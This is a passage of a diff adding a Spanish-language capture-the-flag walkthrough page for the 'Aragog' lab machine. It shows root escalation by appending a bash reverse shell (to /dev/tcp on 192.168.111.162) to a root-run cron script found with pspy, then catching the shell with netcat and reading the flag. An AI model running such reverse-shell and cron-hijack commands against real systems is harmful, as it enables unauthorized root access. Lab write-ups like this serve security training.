+/bin/bash -i &gt;&amp; /dev/tcp/192.168.111.162/4321 0&gt;&amp;1
+</code></pre>
+<p>Para corroborar si el script está siendo ejecutado se ejecutó <a href="https://github.com/DominicBreuker/pspy">pspy</a>, identificando así que está siendo ejecutado por el usuario <code>root</code>. Bastaría con añadir el comando que se desee (como una reverse shell) para escalar al usuario <code>root</code>.</p>
+<pre><code class="language-bash">2023/03/07 04:03:10 CMD: UID=0    PID=1      | /sbin/init
+2023/03/07 04:04:01 CMD: UID=0    PID=2367   | /usr/sbin/CRON -f
+2023/03/07 04:04:01 CMD: UID=0    PID=2368   | /usr/sbin/CRON -f
+2023/03/07 04:04:01 CMD: UID=0    PID=2369   | /bin/sh -c bash -c &quot;/opt/.backup.sh&quot;
+2023/03/07 04:04:01 CMD: UID=0    PID=2370   | /bin/bash /opt/.backup.sh
+</code></pre>
+<p>Ejecutando por ejemplo:</p>
+<pre><code class="language-bash">hagrid98@Aragog:~$ echo 'bash -i &gt;&amp; /dev/tcp/192.168.111.162/443 0&gt;&amp;1' &gt;&gt; /opt/.backup.sh &amp;&amp; cat /opt/.backup.sh
+#!/bin/bash
+
+cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
+bash -i &gt;&amp; /dev/tcp/192.168.111.162/443 0&gt;&amp;1
+</code></pre>
+<p>Permitiendo establecer una conexión y el segundo horrocrux.</p>
+<pre><code class="language-bash">└─$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.111.162] from (UNKNOWN) [192.168.111.175] 45738
+bash: cannot set terminal process group (2516): Inappropriate ioctl for device
+bash: no job control in this shell
+root@Aragog:~# ls -la
+ls -la
+total 40
+drwx------  5 root root     4096 Feb  6 10:31 .
+drwxr-xr-x 18 root root     4096 Mar 31  2021 ..
+-rw-------  1 root root      802 Feb  7 08:29 .bash_history
+-rw-r--r--  1 root root      570 Jan 31  2010 .bashrc
+drwx------  3 root root     4096 Mar 31  2021 .gnupg
+-rw-r--r--  1 root hagrid98  818 Apr  1  2021 horcrux2.txt
+drwxr-xr-x  3 root root     4096 Feb  6 02:02 .local
+-rw-r--r--  1 root root      148 Aug 17  2015 .profile
+-rw-r--r--  1 root root       74 Mar 31  2021 .selected_editor
+drwx------  2 root root     4096 Feb  6 10:26 .ssh
+root@Aragog:~# cat horcrux2.txt
+cat horcrux2.txt
+  ____                            _         _       _   _
+ / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___
+| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+ \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+                  |___/
+
+
+Machine Author: Mansoor R (@time4ster)
+Machine Difficulty: Easy
+Machine Name: Aragog
+Horcruxes Hidden in this VM: 2 horcruxes
+
+You have successfully pwned Aragog machine.
+Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
+
+
+
+
+# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
+</code></pre>
+<h2 id="referencias"><a class="header" href="#referencias">Referencias</a></h2>
+<ul>
+<li><a href="https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213/blob/main/wp-file-manager-exploit.sh">Exploit CVE-2020-25213</a>.</li>
+<li><a href="https://github.com/DominicBreuker/pspy">pspy - unprivileged Linux process snooping</a>.</li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../guides/ecpptv2_lab/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../../guides/ecpptv2_lab/2_nagini/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../guides/ecpptv2_lab/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../../guides/ecpptv2_lab/2_nagini/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
